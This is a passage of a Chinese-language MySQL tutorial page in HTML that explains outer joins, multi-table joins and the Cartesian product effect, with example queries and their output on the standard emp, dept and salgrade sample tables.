class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS     <span class="operator">|</span> SCOTT     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES     <span class="operator">|</span> BLAKE     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD      <span class="operator">|</span> JONES     <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER    <span class="operator">|</span> CLARK     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+</span></span><br><span class="line"><span class="number">13</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h1 id="外连接"><a href="#外连接" class="headerlink" title="外连接"></a>外连接</h1><blockquote><p><strong>外连接：A表与B表进行连接，AB两张表中一张为主表，一张为副表，主要查询的是主表中的数据，当副表中的数据不能与主表中的数据匹配时，副表会自动模拟出 NULL 与之匹配。<br>内连接：A表与B表进行连接，将两张表中能够匹配的数据查出来，不能匹配的数据忽略不计。AB两张表没有主次之分，是平等的。</strong></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">特点：查询占主导地位的表，捎带着查询副表中的数据，当副表中数据与之不匹配时，自动以 <span class="keyword">NULL</span> 替换，不会丢失主表中的数据。</span><br><span class="line"></span><br><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">left</span><span class="operator">/</span><span class="keyword">right</span> <span class="keyword">outer</span> <span class="keyword">join</span> <span class="operator">/</span><span class="operator">/</span><span class="keyword">outer</span> 可省略</span><br><span class="line"></span><br><span class="line"><span class="keyword">on</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span> </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">注：</span><br><span class="line"><span class="keyword">left</span>表示左连接，即左边占主导地位</span><br><span class="line"><span class="keyword">right</span>表示右连接，即右边占指导地位</span><br></pre></td></tr></table></figure><p>示例：找出哪一个部门没有员工</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span>   <span class="keyword">select</span> dname,ename <span class="keyword">from</span> dept a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> dname      <span class="operator">|</span> ename  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> SMITH  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> ALLEN  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> WARD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> JONES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> MARTIN <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> BLAKE  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span> CLARK  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> SCOTT  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span> KING   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> TURNER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> ADAMS  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span> JAMES  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span> FORD   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span> MILLER <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span> <span class="keyword">NULL</span>   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="number">15</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span>   <span class="keyword">select</span> dname,ename <span class="keyword">from</span> dept a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno <span class="keyword">where</span> b.ename <span class="keyword">is</span> <span class="keyword">NULL</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-------+</span></span><br><span class="line"><span class="operator">|</span> dname      <span class="operator">|</span> ename <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-------+</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span> <span class="keyword">NULL</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+-------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h1 id="多表查询-1"><a href="#多表查询-1" class="headerlink" title="多表查询"></a>多表查询</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">语法：</span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span></span><br><span class="line"></span><br><span class="line">join...on...join...on...join...on... </span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">举例理解：</span><br><span class="line"><span class="keyword">select</span> a.ename,b.dname,c.grade <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="keyword">between</span> c.losal <span class="keyword">and</span> c.hisal;</span><br><span class="line">解释：emp a 先与 dept b 进行外连接查询，查询出之后的表再与 salgrade c 进行内连接查询。</span><br><span class="line"></span><br><span class="line">注：</span><br><span class="line">什么时候需要外连接查询，什么时候不需要，并且注意哪一张表作为主表，哪张表是副表，使用左连接与右连接要灵活。</span><br></pre></td></tr></table></figure><p>示例一：找出每位员工的部门名称和工资等级</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">员工部门编号，员工名称，月薪：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> empno,ename,sal <span class="keyword">from</span> emp;</span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+---------+</span></span><br><span class="line"><span class="operator">|</span> empno <span class="operator">|</span> ename  <span class="operator">|</span> sal     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+---------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7369</span> <span class="operator">|</span> SMITH  <span class="operator">|</span>  <span class="number">800.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7499</span> <span class="operator">|</span> ALLEN  <span class="operator">|</span> <span class="number">1600.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7521</span> <span class="operator">|</span> WARD   <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7566</span> <span class="operator">|</span> JONES  <span class="operator">|</span> <span class="number">2975.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7654</span> <span class="operator">|</span> MARTIN <span class="operator">|</span> <span class="number">1250.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7698</span> <span class="operator">|</span> BLAKE  <span class="operator">|</span> <span class="number">2850.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7782</span> <span class="operator">|</span> CLARK  <span class="operator">|</span> <span class="number">2450.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7788</span> <span class="operator">|</span> SCOTT  <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7839</span> <span class="operator">|</span> KING   <span class="operator">|</span> <span class="number">5000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7844</span> <span class="operator">|</span> TURNER <span class="operator">|</span> <span class="number">1500.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7876</span> <span class="operator">|</span> ADAMS  <span class="operator">|</span> <span class="number">1100.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7900</span> <span class="operator">|</span> JAMES  <span class="operator">|</span>  <span class="number">950.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7902</span> <span class="operator">|</span> FORD   <span class="operator">|</span> <span class="number">3000.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">7934</span> <span class="operator">|</span> MILLER <span class="operator">|</span> <span class="number">1300.00</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------+--------+---------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">部门编号，部门名称：</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> deptno,dname <span class="keyword">from</span> dept;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> deptno <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>     <span class="number">40</span> <span class="operator">|</span> OPERATIONS <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,b.dname <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename,b.dname,c.grade <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> dept b <span class="keyword">on</span> a.deptno<span class="operator">=</span>b.deptno <span class="keyword">join</span> salgrade c <span class="keyword">on</span> a.sal <span class="keyword">between</span> c.losal <span class="keyword">and</span> c.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> dname      <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+-------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>示例二：出每位员工的部门名称，工资等级，以及上级领导</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a.ename <span class="keyword">as</span> <span class="string">&#x27;员工名&#x27;</span>,b.ename <span class="keyword">as</span> <span class="string">&#x27;领导名&#x27;</span>,c.dname,d.grade <span class="keyword">from</span> emp a <span class="keyword">left</span> <span class="keyword">join</span> emp b <span class="keyword">on</span> a.mgr<span class="operator">=</span>b.empno <span class="keyword">join</span> dept c <span class="keyword">on</span> a.deptno<span class="operator">=</span>c.deptno <span class="keyword">join</span> salgrade d <span class="keyword">on</span> a.sal <span class="keyword">between</span> d.losal <span class="keyword">and</span> d.hisal;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> 员工名    <span class="operator">|</span> 领导名    <span class="operator">|</span> dname      <span class="operator">|</span> grade <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+------------+-------+</span></span><br><span class="line"><span class="operator">|</span> SMITH     <span class="operator">|</span> FORD      <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN     <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD      <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES     <span class="operator">|</span> KING      <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN    <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE     <span class="operator">|</span> KING      <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK     <span class="operator">|</span> KING      <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT     <span class="operator">|</span> JONES     <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING      <span class="operator">|</span> <span class="keyword">NULL</span>      <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">5</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER    <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS     <span class="operator">|</span> SCOTT     <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES     <span class="operator">|</span> BLAKE     <span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD      <span class="operator">|</span> JONES     <span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">4</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER    <span class="operator">|</span> CLARK     <span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------+-----------+------------+-------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><h1 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h1><blockquote><p><strong>在实际开发中，一般一个业务会对应多张表，因此大部分情况下都不是从单表中查询数据，而是多张表联合查询数据从而取出最终的结果。这也是关系型数据库存在的原因。</strong></p></blockquote><p><strong>分类</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">根据年代划分：</span><br><span class="line">SQL92:旧的语法</span><br><span class="line">SQL99:较新的语法</span><br><span class="line"></span><br><span class="line">根据表的连接方式划分：</span><br><span class="line">内连接：分为等值连接，非等值连接，自连接</span><br><span class="line">外连接：分为左外连接（左连接），右外连接（右连接）</span><br><span class="line">全连接</span><br></pre></td></tr></table></figure><p><strong>笛卡尔积现象 (笛卡尔乘积现象)</strong></p><blockquote><p><strong>现象</strong>：当两张表进行连接查询时，如果没有条件限制的话，最终查询结果条数将会是两张表记录条数的乘积。<br><strong>避免笛卡尔乘积现象：添加条件进行过滤</strong><br>取表的别名：提高执行效率，增强可读性</p></blockquote><blockquote><p><strong>注：添加条件进行过滤并不会减少记录的匹配记录，仍然是两张表记录条数的乘积，只不过最终显示出来的是过滤之后的有效信息而已。</strong></p></blockquote><p><strong>示例：</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">找到每个员工的部门名称</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> dname,deptno <span class="keyword">from</span> dept;<span class="operator">/</span><span class="operator">/</span>部门名称以及部门编号</span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> dname      <span class="operator">|</span> deptno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="operator">|</span> ACCOUNTING <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> RESEARCH   <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SALES      <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> OPERATIONS <span class="operator">|</span>     <span class="number">40</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------+--------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> ename,deptno <span class="keyword">from</span> emp;<span class="operator">/</span><span class="operator">/</span>员工名称以及对应部门编号</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> ename  <span class="operator">|</span> deptno <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="operator">|</span> SMITH  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ALLEN  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> WARD   <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JONES  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MARTIN <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> BLAKE  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> CLARK  <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> SCOTT  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> KING   <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> TURNER <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> ADAMS  <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> JAMES  <span class="operator">|</span>     <span class="number">30</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> FORD   <span class="operator">|</span>     <span class="number">20</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> MILLER <span class="operator">|</span>     <span class="number">10</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+--------+</span></span><br><span class="line"><span class="number">14</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用：<span class="keyword">select</span> ename,dname <span class="keyword">from</span> emp,dept;</span><br><span class="line">查出来的结果为两张表记录条数的乘积，即<span class="number">14</span><span class="operator">*</span><span class="number">4</span><span class="operator">=</span><span class="number">56</span>。</span><br><span class="line"></span><br><span 